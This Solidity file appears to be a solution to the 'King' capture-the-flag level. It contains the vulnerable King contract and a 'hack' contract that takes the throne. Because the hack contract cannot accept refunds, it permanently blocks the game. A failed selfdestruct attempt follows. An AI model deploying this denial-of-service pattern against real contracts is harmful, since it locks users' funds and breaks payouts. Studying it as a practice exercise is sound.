// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
//______________________________________________________________________________________________________________________________________


contract hack
{
    King j;
    constructor(address payable i){j= King(i);}
    function f1() payable  public 
    {
        // payable(j).transfer(msg.sender)
        (bool i,)=payable(j).call{value:msg.value}("");
        require(i,"f1 fail");
    }
}

//________________________________________________________________________________________________________________________________________

//unsucessful atempt
contract try_revert_hack_using_selfdestruct      // Selfdestruct  -> Transfer all fund to ->King smartcontract without calling receive funtion
{
    King j;
    constructor(address payable i){j= King(i);}
    function f1() payable  public 
    {
        selfdestruct(payable (j));
    }
    receive() external payable {}
}
